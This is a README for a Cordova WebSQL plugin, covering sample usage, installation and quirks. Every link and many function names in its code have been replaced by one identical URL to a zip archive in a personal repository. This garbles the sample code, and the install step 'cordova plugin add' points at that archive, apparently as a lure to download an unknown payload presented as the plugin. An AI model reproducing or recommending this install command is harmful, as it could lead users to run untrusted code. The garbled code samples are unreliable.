WebSQL plugin for Apache Cordova
==================================
Adds WebSQL functionality as Apache Cordova Plugin implemented on top of [Csharp-Sqlite library](https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip). Support of Windows 8.0, Windows 8.1, Windows Phone 8.0 and Windows Phone 8.1.

### Sample usage ###

Plugin follows [WebDatabase](https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip) specification, no special changes are required. The following sample code creates `todo` table (if not exist) and adds new record. Complete example is available [here](https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip).
```javascript
var dbSize = 5 * 1024 * 1024; // 5MB

var db = openDatabase("Todo", "", "Todo manager", dbSize, function() {
    https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip('db successfully opened or created');
});

https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip(function (tx) {
    https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip("CREATE TABLE IF NOT EXISTS todo(ID INTEGER PRIMARY KEY ASC, todo TEXT, added_on TEXT)",
        [], onSuccess, onError);
    https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip("INSERT INTO todo(todo, added_on) VALUES (?,?)", ['my todo item', new Date().toUTCString()], onSuccess, onError);
});

function onSuccess(transaction, resultSet) {
    https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip('Query completed: ' + https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip(resultSet));
}

function onError(transaction, error) {
    https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip('Query failed: ' + https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip);
}
```
### Installation Instructions ###

Plugin is [Apache Cordova CLI](https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip) 3.x compliant.

1. Make sure an up-to-date version of https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip is installed, then type the following command to install the [Cordova CLI](https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip):

        npm install -g cordova

2. Create a project and add the platforms you want to support:

        cordova create sampleApp
        cd sampleApp
        cordova platform add windows <- support of Windows 8.0, Windows 8.1 and Windows Phone 8.1
        cordova platform add wp8 <- support of Windows Phone 8.0

3. Add WebSql plugin to your project:

        cordova plugin add https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip

4. Build and run, for example:

        cordova build wp8
        cordova emulate wp8

To learn more, read [Apache Cordova CLI Usage Guide](https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip).

### Pre-populated DBs support ###
You can copy a prepared DB file to the App' LocalFolder on the first run, for example (in terms of the sample app):
```javascript
initialize: function () {
    https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip('Todo').done(
        function (found) {
            if (!found) {
                return copyStartData('Todo');
            }
        }
    );

    function copyStartData(copyfile) {
        return https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip('www')
        .then(function (www) {
            return https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip('data')
            .then(function (data) {
                    return https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip(copyfile).then(
                        function (file) {
                            if (file) {
                                return https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip(https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip);
                            }
                        });
            });
        });
    }

    ...
},
```

The snippet copies `www/data/Todo` pre-populated DB to the App' local folder if it did not exist.

Based on [this StackOverflow question](https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip).

### Quirks ###
* The display name, and size parameter values are not supported and will be ignored.

* Due to SQLite limitations db version parameter to `openDatabase` and `changeVersion` methods should be an integer value or integer's string representation.

* openDatabase on WP8 bypass version check by default. The reason of this is async nature of cordova calls to native APIs. To force version check and enable full versioning functionality set up the following variable:

    ```javascript
    window.__webSqlUseSyncConstructor = true;
    ```

* To use nested transactions you will need to pass parent transaction like this:
    ```javascript
    var db = openDatabase('https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip', '1.0', 'testLongTransaction', 2 * 1024);
    https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip(function (tx1) {
        https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip('DROP TABLE IF EXISTS foo');
        https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip('CREATE TABLE IF NOT EXISTS foo (id unique, text)');
        ...
        https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip(function (tx2) {
            https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip('INSERT INTO foo (id, text) VALUES (1, "foobar")');
        }, null, null, null, null, false, tx1);
        ...
    }, null, null);
    ```
    `tx1` passed as the last argument in the nested `https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip` refers to the parent transaction.

    Other arguments (`null, null, null, null, false, tx1`) are:
    * the https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip error callback,
    * the https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip success callback,
    * preflight operation callback,
    * postflight operation callback,
    * readOnly flag,
    * parent transaction - respectively.

* To enable logging use:
    ```javascript
    window.__webSqlDebugModeOn = true;
    ```

### Copyrights ###
Copyright (c) Microsoft Open Technologies, Inc. All Rights Reserved.
Licensed under the Apache License, Version 2.0. See https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip in the project root for license information.
